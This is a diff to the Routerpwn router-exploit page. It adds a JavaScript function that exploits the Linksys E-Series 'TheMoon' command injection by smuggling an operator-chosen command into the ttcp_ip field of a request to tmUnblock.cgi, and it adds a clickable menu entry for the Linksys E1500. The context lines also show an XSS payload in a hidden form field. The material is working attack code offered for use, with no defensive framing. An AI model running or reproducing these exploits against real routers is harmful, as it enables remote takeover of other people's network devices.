@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.20.237</title>
+		<title>Routerpwn 1.20.238</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -678,6 +678,21 @@ function e4200_dirtraversal(ip)
 	
 }
 
+// Linksys E-Series TheMoon Remote Command Injection Exploit
+function themoon_remoteexec(ip)
+{
+	ip = ip || "192.168.1.1";
+	cmd = prompt("Command:");
+	var form = '<input	type="hidden"	name="change_action"	value=""/>';
+	form += '<input	type="hidden"	name="action"	value=""/>';
+	form += '<input	type="hidden"	name="commit"	value="0"/>';
+	form += '<input	type="hidden"	name="ttcp_num"	value="2"/>';
+	form += '<input	type="hidden"	name="ttcp_size"	value="2"/>';
+	form += '<input	type="hidden"	name="ttcp_ip"	value="-h"' + encodeURI(cmd);
+	form += '"/><input	type="hidden"	name="StartEPI" value="1"/>';
+	form += '</form>';
+	post('http://' + ip + '/tmUnblock.cgi', form);
+}
 
 // Linksys X3000 - OS Command Inyection
 function x3000_command(ip)
@@ -3081,7 +3096,14 @@ function belkinwpspin()
 <input type="hidden" name="submit_button" value="%27%3balert(%22i CaN hAZ XSS by G42%22)%3b//&amp;">
 </form>
 <h2>Cisco</h2>
-<h3><a href="javascript:img('Linksys EA2700')">Linksys EA2700</a>, <a href="javascript:img('Linksys WRT54G')">Linksys WRT54G</a>, <a href="javascript:img('WAG120N')">Linksys WAG120N</a>, <a href="javascript:img('Linksys X3000')">Linksys X3000</a>, <a href="javascript:img('Linksys WRT110')">Linksys WRT110</a>, <a href="javascript:img('EPC3925')">EPC3925</a></h3>
+<h3><a href="javascript:img('Linksys EA2700')">Linksys EA2700</a>, <a href="javascript:img('Linksys WRT54G')">Linksys WRT54G</a>, <a href="javascript:img('WAG120N')">Linksys WAG120N</a>, <a href="javascript:img('Linksys X3000')">Linksys X3000</a>, <a href="javascript:img('Linksys WRT110')">Linksys WRT110</a>, <a href="javascript:img('EPC3925')">EPC3925</a>, <a href="javascript:img('E1500')">E1500</a></h3>
+
+<article>
+	<div>05/04/14</div>
+	<div><a href="http://www.1337day.com/exploit/22108">[+]</a></div>
+	<div><a href="javascript:themoon_remoteexec()">Linksys E1500 - Remote Command Execution</a></div>
+	<div><a href="javascript:themoon_remoteexec(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>12/11/13</div>
